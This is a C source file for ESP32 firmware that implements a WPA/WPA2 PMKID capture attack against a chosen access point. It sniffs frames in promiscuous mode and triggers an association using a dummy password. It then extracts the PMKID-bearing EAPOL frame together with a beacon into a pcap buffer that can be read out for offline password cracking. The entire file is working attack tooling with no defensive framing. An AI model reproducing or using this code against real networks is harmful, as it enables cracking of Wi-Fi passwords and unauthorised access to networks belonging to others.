#include "wifi_pmkid.h"
#include "wifi_manager.h"
#include "esp_log.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include <string.h>

#define TAG "wifi_pmkid"
#define PMKID_BUF_SIZE 4096
#define IEEE80211_HDR_LEN 24
#define LLC_SNAP_LEN 8

typedef struct {
    uint8_t frame_ctrl[2];
    uint8_t duration[2];
    uint8_t addr1[6];
    uint8_t addr2[6];
    uint8_t addr3[6];
    uint8_t seq_ctrl[2];
} __attribute__((packed)) ieee80211_hdr_t;

typedef struct {
    uint32_t magic;
    uint16_t version_major;
    uint16_t version_minor;
    int32_t  thiszone;
    uint32_t sigfigs;
    uint32_t snaplen;
    uint32_t network;
} __attribute__((packed)) pcap_hdr_t;

typedef struct {
    uint32_t ts_sec;
    uint32_t ts_usec;
    uint32_t incl_len;
    uint32_t orig_len;
} __attribute__((packed)) pcap_rec_t;

static uint8_t s_target[6];
static char s_ssid[33];
static uint8_t s_buf[PMKID_BUF_SIZE];
static uint32_t s_len;
static bool s_running;
static bool s_beacon_saved;
static pmkid_state_t s_state;
static SemaphoreHandle_t s_lock;
static TaskHandle_t s_tx_task;

static bool pcap_append(const uint8_t *frame, uint16_t frame_len,
                        const wifi_pkt_rx_ctrl_t *rx)
{
    if (!frame_len || xSemaphoreTake(s_lock, 0) != pdTRUE) return false;
    uint32_t need = sizeof(pcap_rec_t) + frame_len;
    if (s_len + need > sizeof(s_buf)) {
        xSemaphoreGive(s_lock);
        return false;
    }
    pcap_rec_t rec = {
        .ts_sec = (uint32_t)(rx->timestamp / 1000000U),
        .ts_usec = (uint32_t)(rx->timestamp % 1000000U),
        .incl_len = frame_len,
        .orig_len = frame_len,
    };
    memcpy(&s_buf[s_len], &rec, sizeof(rec));
    s_len += sizeof(rec);
    memcpy(&s_buf[s_len], frame, frame_len);
    s_len += frame_len;
    xSemaphoreGive(s_lock);
    return true;
}

static void association_task(void *arg)
{
    (void)arg;
    esp_err_t err = esp_wifi_connect();
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "association failed: %s", esp_err_to_name(err));
        s_state = PMKID_FAILED;
        s_running = false;
        esp_wifi_set_promiscuous_rx_cb(NULL);
        esp_wifi_set_promiscuous(false);
    }
    s_tx_task = NULL;
    vTaskDelete(NULL);
}

static bool pmkid_kde_present(const uint8_t *eapol, uint16_t avail)
{
    if (avail < 99) return false;
    uint16_t key_info = ((uint16_t)eapol[5] << 8) | eapol[6];
    if (!(key_info & 0x0080) || (key_info & 0x0100)) return false;
    uint16_t kd_len = ((uint16_t)eapol[97] << 8) | eapol[98];
    if (kd_len > avail - 99) return false;

    const uint8_t *kd = eapol + 99;
    for (uint16_t off = 0; off + 2 <= kd_len;) {
        uint8_t el_len = kd[off + 1];
        if (off + 2 + el_len > kd_len) break;
        if (kd[off] == 0xDD && el_len >= 20 &&
            kd[off + 2] == 0x00 && kd[off + 3] == 0x0F &&
            kd[off + 4] == 0xAC && kd[off + 5] == 0x04)
            return true;
        off = (uint16_t)(off + 2 + el_len);
    }
    return false;
}

static void promisc_rx(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (!s_running || (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA)) return;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    uint16_t len = pkt->rx_ctrl.sig_len;
    if (len < IEEE80211_HDR_LEN) return;
    const ieee80211_hdr_t *hdr = (const ieee80211_hdr_t *)pkt->payload;
    if (memcmp(hdr->addr1, s_target, 6) && memcmp(hdr->addr2, s_target, 6) &&
        memcmp(hdr->addr3, s_target, 6)) return;

    uint8_t fc0 = hdr->frame_ctrl[0];
    if ((fc0 & 0x0C) == 0) {
        if (!s_beacon_saved && (fc0 & 0xF0) == 0x80)
            s_beacon_saved = pcap_append(pkt->payload, len, &pkt->rx_ctrl);
        return;
    }
    if ((fc0 & 0x0C) != 0x08) return;

    uint16_t hdrlen = IEEE80211_HDR_LEN + ((fc0 & 0x80) ? 2 : 0);
    if (len < hdrlen + LLC_SNAP_LEN + 99) return;
    const uint8_t *llc = pkt->payload + hdrlen;
    static const uint8_t snap[8] = { 0xAA, 0xAA, 0x03, 0, 0, 0, 0x88, 0x8E };
    if (memcmp(llc, snap, sizeof(snap)) != 0) return;
    const uint8_t *eapol = llc + LLC_SNAP_LEN;
    uint16_t avail = (uint16_t)(len - hdrlen - LLC_SNAP_LEN);
    if (eapol[1] != 3 || !pmkid_kde_present(eapol, avail)) return;

    if (pcap_append(pkt->payload, len, &pkt->rx_ctrl)) {
        s_state = PMKID_COMPLETE;
        ESP_LOGI(TAG, "PMKID captured, pcap=%lu", (unsigned long)s_len);
    }
}

esp_err_t wifi_pmkid_start(const uint8_t bssid[6], uint8_t channel,
                           const char *ssid)
{
    if (!bssid || !ssid || channel < 1 || channel > 14) return ESP_ERR_INVALID_ARG;
    if (s_running) return ESP_ERR_INVALID_STATE;
    if (!s_lock) {
        s_lock = xSemaphoreCreateMutex();
        if (!s_lock) return ESP_ERR_NO_MEM;
    }

    memcpy(s_target, bssid, 6);
    strncpy(s_ssid, ssid, sizeof(s_ssid) - 1);
    s_ssid[sizeof(s_ssid) - 1] = 0;
    s_beacon_saved = false;
    s_state = PMKID_CAPTURING;
    pcap_hdr_t gh = {
        .magic = 0xA1B2C3D4,
        .version_major = 2,
        .version_minor = 4,
        .thiszone = 0,
        .sigfigs = 0,
        .snaplen = 65535,
        .network = 105,
    };
    memcpy(s_buf, &gh, sizeof(gh));
    s_len = sizeof(gh);

    esp_err_t err = esp_wifi_set_promiscuous(true);
    if (err != ESP_OK) goto fail;
    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA,
    };
    err = esp_wifi_set_promiscuous_filter(&filter);
    if (err != ESP_OK) goto fail;
    err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) goto fail;
    err = esp_wifi_set_promiscuous_rx_cb(promisc_rx);
    if (err != ESP_OK) goto fail;

    wifi_config_t config = {0};
    strncpy((char *)config.sta.ssid, s_ssid, sizeof(config.sta.ssid) - 1);
    memcpy(config.sta.bssid, s_target, 6);
    config.sta.bssid_set = true;
    config.sta.channel = channel;
    config.sta.threshold.authmode = WIFI_AUTH_WPA_WPA2_PSK;
    config.sta.pmf_cfg.capable = true;
    config.sta.pmf_cfg.required = false;
    strncpy((char *)config.sta.password, "pmkid_probe", sizeof(config.sta.password) - 1);
    err = esp_wifi_set_mode(WIFI_MODE_STA);
    if (err != ESP_OK) goto fail;
    err = esp_wifi_set_storage(WIFI_STORAGE_RAM);
    if (err != ESP_OK) goto fail;
    err = esp_wifi_set_config(WIFI_IF_STA, &config);
    if (err != ESP_OK) goto fail;

    s_running = true;
    if (xTaskCreate(association_task, "pmkid_assoc", 3072, NULL, 6, &s_tx_task) != pdPASS) {
        err = ESP_ERR_NO_MEM;
        goto fail;
    }
    return ESP_OK;

fail:
    s_running = false;
    s_state = PMKID_FAILED;
    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_set_promiscuous(false);
    return err;
}

void wifi_pmkid_stop(void)
{
    s_running = false;
    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_mode(WIFI_MODE_STA);
    wifi_mgr_disconnect();
    if (s_state == PMKID_CAPTURING) s_state = PMKID_IDLE;
}

pmkid_state_t wifi_pmkid_state(void) { return s_state; }

uint32_t wifi_pmkid_len(void)
{
    if (!s_lock) return 0;
    xSemaphoreTake(s_lock, portMAX_DELAY);
    uint32_t n = s_len;
    xSemaphoreGive(s_lock);
    return n;
}

int wifi_pmkid_read(uint32_t offset, uint8_t *out, uint16_t max)
{
    if (!out || !max || !s_lock) return 0;
    xSemaphoreTake(s_lock, portMAX_DELAY);
    int n = 0;
    if (offset < s_len) {
        uint32_t avail = s_len - offset;
        n = avail < max ? (int)avail : (int)max;
        memcpy(out, &s_buf[offset], (size_t)n);
    }
    xSemaphoreGive(s_lock);
    return n;
}
